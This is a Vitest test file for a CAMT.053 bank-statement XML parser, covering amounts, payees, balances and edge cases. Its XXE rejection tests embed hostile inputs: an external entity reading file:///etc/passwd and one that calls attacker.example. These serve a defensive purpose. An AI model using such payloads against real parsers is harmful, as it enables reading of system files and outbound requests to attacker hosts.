import { describe, it, expect } from 'vitest';

import { parseCamt053 } from '../camt053';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Wrap statement content in a minimal valid CAMT.053 Document envelope. */
function wrapDocument(stmtContent: string): string {
  return `<?xml version="1.0" encoding="UTF-8"?>
<Document xmlns="urn:iso:std:iso:20022:tech:xsd:camt.053.001.02">
  <BkToCstmrStmt>
    ${stmtContent}
  </BkToCstmrStmt>
</Document>`;
}

/** Build a minimal <Stmt> with one Ntry entry. */
function buildStmt({
  id = 'STMT001',
  iban = 'DE89370400440532013000',
  entries = '',
  balances = '',
}: {
  id?: string;
  iban?: string;
  entries?: string;
  balances?: string;
} = {}): string {
  return `<Stmt>
      <Id>${id}</Id>
      <Acct><Id><IBAN>${iban}</IBAN></Id></Acct>
      ${balances}
      ${entries}
    </Stmt>`;
}

function buildNtry({
  amount = '100.00',
  ccy = 'EUR',
  cdtDbtInd = 'CRDT',
  date = '2026-02-24',
  payeeTag = 'Dbtr',
  payeeName = 'Max Mustermann',
  remittance = 'Gehalt Februar',
  debtorIban = '',
}: {
  amount?: string;
  ccy?: string;
  cdtDbtInd?: string;
  date?: string;
  payeeTag?: 'Dbtr' | 'Cdtr';
  payeeName?: string;
  remittance?: string;
  debtorIban?: string;
} = {}): string {
  const ibanEl = debtorIban
    ? `<DbtrAcct><Id><IBAN>${debtorIban}</IBAN></Id></DbtrAcct>`
    : '';
  return `<Ntry>
        <Amt Ccy="${ccy}">${amount}</Amt>
        <CdtDbtInd>${cdtDbtInd}</CdtDbtInd>
        <BookgDt><Dt>${date}</Dt></BookgDt>
        <NtryDtls><TxDtls>
          <RltdPties>
            <${payeeTag}><Nm>${payeeName}</Nm></${payeeTag}>
            ${ibanEl}
          </RltdPties>
          <RmtInf><Ustrd>${remittance}</Ustrd></RmtInf>
        </TxDtls></NtryDtls>
      </Ntry>`;
}

/** Minimal valid CAMT.053 with one credit entry. */
const MINIMAL_CREDIT_XML = wrapDocument(
  buildStmt({ entries: buildNtry() }),
);

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('parseCamt053', () => {
  // -------------------------------------------------------------------------
  // Basic parsing — empty / invalid input
  // -------------------------------------------------------------------------

  describe('empty and invalid input', () => {
    it('returns error for empty string', () => {
      const result = parseCamt053('');
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.rows).toHaveLength(0);
      expect(result.errors[0]).toMatch(/leer/i);
    });

    it('returns error for whitespace-only string', () => {
      const result = parseCamt053('   \n\t  ');
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.rows).toHaveLength(0);
    });

    it('returns error for invalid XML', () => {
      const result = parseCamt053('<not-valid-xml><<garbage');
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.rows).toHaveLength(0);
      // Should mention XML error
      expect(result.errors[0]).toMatch(/XML/i);
    });

    it('returns error when no Stmt element is found', () => {
      const result = parseCamt053(
        '<?xml version="1.0"?><Document xmlns="urn:iso:std:iso:20022:tech:xsd:camt.053.001.02"><BkToCstmrStmt></BkToCstmrStmt></Document>',
      );
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.rows).toHaveLength(0);
      expect(result.errors[0]).toMatch(/Stmt/i);
    });
  });

  // -------------------------------------------------------------------------
  // Basic parsing — valid documents
  // -------------------------------------------------------------------------

  describe('minimal valid document', () => {
    it('parses one credit entry correctly', () => {
      const result = parseCamt053(MINIMAL_CREDIT_XML);
      expect(result.errors).toHaveLength(0);
      expect(result.rows).toHaveLength(1);

      const row = result.rows[0];
      expect(row.amount).toBe(100);
      expect(row.payee).toBe('Max Mustermann');
      expect(row.date).toBe('2026-02-24');
      expect(row.notes).toBe('Gehalt Februar');
    });

    it('sets bankName to CAMT.053', () => {
      const result = parseCamt053(MINIMAL_CREDIT_XML);
      expect(result.bankName).toBe('CAMT.053');
    });

    it('sets encoding to utf-8', () => {
      const result = parseCamt053(MINIMAL_CREDIT_XML);
      expect(result.encoding).toBe('utf-8');
    });
  });

  describe('debit / credit sign handling', () => {
    it('credit entry (CRDT) produces positive amount', () => {
      const xml = wrapDocument(buildStmt({ entries: buildNtry({ cdtDbtInd: 'CRDT', amount: '250.50' }) }));
      const result = parseCamt053(xml);
      expect(result.rows[0].amount).toBe(250.5);
    });

    it('debit entry (DBIT) produces negative amount', () => {
      const xml = wrapDocument(
        buildStmt({
          entries: buildNtry({
            cdtDbtInd: 'DBIT',
            payeeTag: 'Cdtr',
            payeeName: 'REWE Markt',
            amount: '45.99',
            remittance: 'Einkauf',
          }),
        }),
      );
      const result = parseCamt053(xml);
      expect(result.errors).toHaveLength(0);
      expect(result.rows[0].amount).toBe(-45.99);
    });

    it('debit entry extracts creditor name as payee', () => {
      const xml = wrapDocument(
        buildStmt({
          entries: buildNtry({ cdtDbtInd: 'DBIT', payeeTag: 'Cdtr', payeeName: 'Amazon EU' }),
        }),
      );
      const result = parseCamt053(xml);
      expect(result.rows[0].payee).toBe('Amazon EU');
    });
  });

  describe('multiple entries and statements', () => {
    it('parses multiple entries in one statement', () => {
      const entry1 = buildNtry({ amount: '100.00', remittance: 'Eintrag 1' });
      const entry2 = buildNtry({ amount: '200.00', remittance: 'Eintrag 2' });
      const entry3 = buildNtry({ cdtDbtInd: 'DBIT', payeeTag: 'Cdtr', amount: '50.00', remittance: 'Eintrag 3' });
      const xml = wrapDocument(buildStmt({ entries: entry1 + entry2 + entry3 }));
      const result = parseCamt053(xml);
      expect(result.errors).toHaveLength(0);
      expect(result.rows).toHaveLength(3);
    });

    it('combines entries from multiple statements', () => {
      const stmt1 = buildStmt({ id: 'S1', entries: buildNtry({ amount: '10.00' }) });
      const stmt2 = buildStmt({
        id: 'S2',
        iban: 'DE89370400440532013000',
        entries: buildNtry({ amount: '20.00' }) + buildNtry({ amount: '30.00' }),
      });
      const xml = `<?xml version="1.0" encoding="UTF-8"?>
<Document xmlns="urn:iso:std:iso:20022:tech:xsd:camt.053.001.02">
  <BkToCstmrStmt>
    ${stmt1}
    ${stmt2}
  </BkToCstmrStmt>
</Document>`;
      const result = parseCamt053(xml);
      expect(result.errors).toHaveLength(0);
      expect(result.rows).toHaveLength(3);
    });

    it('sums amounts correctly across entries', () => {
      const entry1 = buildNtry({ amount: '150.00' });
      const entry2 = buildNtry({ cdtDbtInd: 'DBIT', payeeTag: 'Cdtr', amount: '75.50' });
      const xml = wrapDocument(buildStmt({ entries: entry1 + entry2 }));
      const result = parseCamt053(xml);
      const amounts = result.rows.map(r => r.amount);
      expect(amounts).toContain(150);
      expect(amounts).toContain(-75.5);
    });
  });

  describe('remittance info (Verwendungszweck)', () => {
    it('extracts Ustrd as notes', () => {
      const xml = wrapDocument(buildStmt({ entries: buildNtry({ remittance: 'Miete März 2026' }) }));
      const result = parseCamt053(xml);
      expect(result.rows[0].notes).toBe('Miete März 2026');
    });

    it('concatenates multiple Ustrd elements', () => {
      const ntry = `<Ntry>
        <Amt Ccy="EUR">50.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <BookgDt><Dt>2026-02-24</Dt></BookgDt>
        <NtryDtls><TxDtls>
          <RltdPties><Dbtr><Nm>Sender</Nm></Dbtr></RltdPties>
          <RmtInf>
            <Ustrd>Teil 1</Ustrd>
            <Ustrd>Teil 2</Ustrd>
          </RmtInf>
        </TxDtls></NtryDtls>
      </Ntry>`;
      const xml = wrapDocument(buildStmt({ entries: ntry }));
      const result = parseCamt053(xml);
      expect(result.rows[0].notes).toBe('Teil 1 Teil 2');
    });

    it('falls back to AddtlNtryInf when no RmtInf present', () => {
      const ntry = `<Ntry>
        <Amt Ccy="EUR">25.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <BookgDt><Dt>2026-02-24</Dt></BookgDt>
        <AddtlNtryInf>Zusätzliche Info</AddtlNtryInf>
        <NtryDtls><TxDtls>
          <RltdPties><Dbtr><Nm>Absender</Nm></Dbtr></RltdPties>
        </TxDtls></NtryDtls>
      </Ntry>`;
      const xml = wrapDocument(buildStmt({ entries: ntry }));
      const result = parseCamt053(xml);
      expect(result.rows[0].notes).toBe('Zusätzliche Info');
    });
  });

  describe('metadata extraction', () => {
    it('extracts account IBAN into metadata.accountIban', () => {
      const result = parseCamt053(MINIMAL_CREDIT_XML);
      expect(result.metadata?.accountIban).toBe('DE89370400440532013000');
    });

    it('extracts opening balance (OPBD) into metadata.openingBalance', () => {
      const balances = `<Bal>
        <Tp><CdOrPrtry><Cd>OPBD</Cd></CdOrPrtry></Tp>
        <Amt Ccy="EUR">1000.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <Dt><Dt>2026-02-01</Dt></Dt>
      </Bal>`;
      const xml = wrapDocument(buildStmt({ balances, entries: buildNtry() }));
      const result = parseCamt053(xml);
      expect(result.metadata?.openingBalance).toBe(1000);
    });

    it('extracts closing balance (CLBD) into metadata.closingBalance', () => {
      const balances = `<Bal>
        <Tp><CdOrPrtry><Cd>CLBD</Cd></CdOrPrtry></Tp>
        <Amt Ccy="EUR">900.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <Dt><Dt>2026-02-28</Dt></Dt>
      </Bal>`;
      const xml = wrapDocument(buildStmt({ balances, entries: buildNtry() }));
      const result = parseCamt053(xml);
      expect(result.metadata?.closingBalance).toBe(900);
    });

    it('applies negative sign for DBIT balance indicator', () => {
      const balances = `<Bal>
        <Tp><CdOrPrtry><Cd>OPBD</Cd></CdOrPrtry></Tp>
        <Amt Ccy="EUR">500.00</Amt>
        <CdtDbtInd>DBIT</CdtDbtInd>
        <Dt><Dt>2026-02-01</Dt></Dt>
      </Bal>`;
      const xml = wrapDocument(buildStmt({ balances, entries: buildNtry() }));
      const result = parseCamt053(xml);
      expect(result.metadata?.openingBalance).toBe(-500);
    });

    it('extracts both OPBD and CLBD balances', () => {
      const balances = `<Bal>
        <Tp><CdOrPrtry><Cd>OPBD</Cd></CdOrPrtry></Tp>
        <Amt Ccy="EUR">2000.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <Dt><Dt>2026-02-01</Dt></Dt>
      </Bal>
      <Bal>
        <Tp><CdOrPrtry><Cd>CLBD</Cd></CdOrPrtry></Tp>
        <Amt Ccy="EUR">1800.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <Dt><Dt>2026-02-28</Dt></Dt>
      </Bal>`;
      const xml = wrapDocument(buildStmt({ balances, entries: buildNtry() }));
      const result = parseCamt053(xml);
      expect(result.metadata?.openingBalance).toBe(2000);
      expect(result.metadata?.closingBalance).toBe(1800);
    });

    it('extracts statement ID into metadata.statementId', () => {
      const xml = wrapDocument(buildStmt({ id: 'STMT-2026-02', entries: buildNtry() }));
      const result = parseCamt053(xml);
      expect(result.metadata?.statementId).toBe('STMT-2026-02');
    });
  });

  // -------------------------------------------------------------------------
  // Security: XXE / size limit
  // -------------------------------------------------------------------------

  describe('security — XXE rejection', () => {
    it('rejects DOCTYPE declaration', () => {
      const xml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Document></Document>`;
      const result = parseCamt053(xml);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.rows).toHaveLength(0);
      expect(result.errors[0]).toMatch(/DOCTYPE|ENTITY/i);
    });

    it('rejects ENTITY declaration without DOCTYPE', () => {
      const xml = `<?xml version="1.0"?>
<!ENTITY xxe SYSTEM "http://attacker.example/evil">
<Document></Document>`;
      const result = parseCamt053(xml);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors[0]).toMatch(/DOCTYPE|ENTITY/i);
    });

    it('rejects mixed-case DOCTYPE variant', () => {
      const xml = `<?xml version="1.0"?>
<!doctype foo [<!ENTITY bar "baz">]>
<Document></Document>`;
      const result = parseCamt053(xml);
      expect(result.errors.length).toBeGreaterThan(0);
    });
  });

  describe('security — size limit', () => {
    it('rejects files larger than 10 MB', () => {
      // Create a string just over 10 MB
      const bigContent = 'A'.repeat(10 * 1024 * 1024 + 1);
      const result = parseCamt053(bigContent);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.rows).toHaveLength(0);
      expect(result.errors[0]).toMatch(/zu groß|10 MB/i);
    });

    it('accepts files exactly at the limit (10 MB)', () => {
      // 10 MB of padding but embed valid XML — however the content will be
      // invalid XML so we just verify the size check itself does not trigger.
      // Build a string with exactly 10*1024*1024 chars; it's just over the
      // threshold-minus-one so the size guard should NOT fire.
      const exactLimit = 'A'.repeat(10 * 1024 * 1024);
      const result = parseCamt053(exactLimit);
      // Should NOT get a size error — it may get an XML error, but not size.
      const hasSizeError = result.errors.some(e => /zu groß|10 MB/i.test(e));
      expect(hasSizeError).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // Edge cases
  // -------------------------------------------------------------------------

  describe('edge cases', () => {
    it('handles namespace-prefixed elements (camt:BkToCstmrStmt)', () => {
      // Some banks emit explicit namespace prefixes
      const xml = `<?xml version="1.0" encoding="UTF-8"?>
<camt:Document xmlns:camt="urn:iso:std:iso:20022:tech:xsd:camt.053.001.02">
  <camt:BkToCstmrStmt>
    <camt:Stmt>
      <camt:Id>NS001</camt:Id>
      <camt:Acct><camt:Id><camt:IBAN>DE89370400440532013000</camt:IBAN></camt:Id></camt:Acct>
      <camt:Ntry>
        <camt:Amt Ccy="EUR">77.77</camt:Amt>
        <camt:CdtDbtInd>CRDT</camt:CdtDbtInd>
        <camt:BookgDt><camt:Dt>2026-02-24</camt:Dt></camt:BookgDt>
        <camt:NtryDtls><camt:TxDtls>
          <camt:RltdPties><camt:Dbtr><camt:Nm>Namespace Sender</camt:Nm></camt:Dbtr></camt:RltdPties>
          <camt:RmtInf><camt:Ustrd>NS-Zweck</camt:Ustrd></camt:RmtInf>
        </camt:TxDtls></camt:NtryDtls>
      </camt:Ntry>
    </camt:Stmt>
  </camt:BkToCstmrStmt>
</camt:Document>`;
      const result = parseCamt053(xml);
      expect(result.errors).toHaveLength(0);
      expect(result.rows).toHaveLength(1);
      expect(result.rows[0].amount).toBe(77.77);
      expect(result.rows[0].payee).toBe('Namespace Sender');
    });

    it('creates row with empty payee and notes when TxDtls is absent', () => {
      const ntry = `<Ntry>
        <Amt Ccy="EUR">10.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <BookgDt><Dt>2026-02-24</Dt></BookgDt>
      </Ntry>`;
      const xml = wrapDocument(buildStmt({ entries: ntry }));
      const result = parseCamt053(xml);
      expect(result.errors).toHaveLength(0);
      expect(result.rows).toHaveLength(1);
      expect(result.rows[0].payee).toBe('');
      expect(result.rows[0].notes).toBe('');
    });

    it('parses amount in non-EUR currency without error', () => {
      const xml = wrapDocument(
        buildStmt({ entries: buildNtry({ amount: '88.00', ccy: 'USD' }) }),
      );
      const result = parseCamt053(xml);
      // Parser does not reject non-EUR entries — currency is informational
      expect(result.errors).toHaveLength(0);
      expect(result.rows).toHaveLength(1);
      expect(result.rows[0].amount).toBe(88);
    });

    it('parses ISO datetime in BookgDt (falls back to date portion)', () => {
      const ntry = `<Ntry>
        <Amt Ccy="EUR">33.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <BookgDt><DtTm>2026-02-24T10:30:00</DtTm></BookgDt>
        <NtryDtls><TxDtls>
          <RltdPties><Dbtr><Nm>DtTm Sender</Nm></Dbtr></RltdPties>
        </TxDtls></NtryDtls>
      </Ntry>`;
      const xml = wrapDocument(buildStmt({ entries: ntry }));
      const result = parseCamt053(xml);
      expect(result.errors).toHaveLength(0);
      expect(result.rows[0].date).toBe('2026-02-24');
    });

    it('falls back to ValDt when BookgDt is absent', () => {
      const ntry = `<Ntry>
        <Amt Ccy="EUR">12.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <ValDt><Dt>2026-02-20</Dt></ValDt>
        <NtryDtls><TxDtls>
          <RltdPties><Dbtr><Nm>ValDt Sender</Nm></Dbtr></RltdPties>
        </TxDtls></NtryDtls>
      </Ntry>`;
      const xml = wrapDocument(buildStmt({ entries: ntry }));
      const result = parseCamt053(xml);
      expect(result.errors).toHaveLength(0);
      expect(result.rows[0].date).toBe('2026-02-20');
    });

    it('records error (not crash) when no date is found on an entry', () => {
      const ntry = `<Ntry>
        <Amt Ccy="EUR">99.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
      </Ntry>`;
      const xml = wrapDocument(buildStmt({ entries: ntry }));
      const result = parseCamt053(xml);
      // The entry should produce a per-entry error, not a crash
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.rows).toHaveLength(0);
    });

    it('extracts debtor IBAN from transaction details', () => {
      const xml = wrapDocument(
        buildStmt({
          entries: buildNtry({ debtorIban: 'DE89370400440532013000' }),
        }),
      );
      const result = parseCamt053(xml);
      expect(result.errors).toHaveLength(0);
      // Credit entry → look for DbtrAcct
      expect(result.rows[0].iban).toBe('DE89370400440532013000');
    });

    it('extracts NtryRef as reference', () => {
      const ntry = `<Ntry>
        <NtryRef>REF-2026-001</NtryRef>
        <Amt Ccy="EUR">55.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <BookgDt><Dt>2026-02-24</Dt></BookgDt>
        <NtryDtls><TxDtls>
          <RltdPties><Dbtr><Nm>Ref Sender</Nm></Dbtr></RltdPties>
        </TxDtls></NtryDtls>
      </Ntry>`;
      const xml = wrapDocument(buildStmt({ entries: ntry }));
      const result = parseCamt053(xml);
      expect(result.rows[0].reference).toBe('REF-2026-001');
    });

    it('uses PRCD code as opening balance fallback', () => {
      const balances = `<Bal>
        <Tp><CdOrPrtry><Cd>PRCD</Cd></CdOrPrtry></Tp>
        <Amt Ccy="EUR">750.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <Dt><Dt>2026-02-01</Dt></Dt>
      </Bal>`;
      const xml = wrapDocument(buildStmt({ balances, entries: buildNtry() }));
      const result = parseCamt053(xml);
      expect(result.metadata?.openingBalance).toBe(750);
    });

    it('uses CLAV code as closing balance fallback', () => {
      const balances = `<Bal>
        <Tp><CdOrPrtry><Cd>CLAV</Cd></CdOrPrtry></Tp>
        <Amt Ccy="EUR">650.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <Dt><Dt>2026-02-28</Dt></Dt>
      </Bal>`;
      const xml = wrapDocument(buildStmt({ balances, entries: buildNtry() }));
      const result = parseCamt053(xml);
      expect(result.metadata?.closingBalance).toBe(650);
    });
  });
});
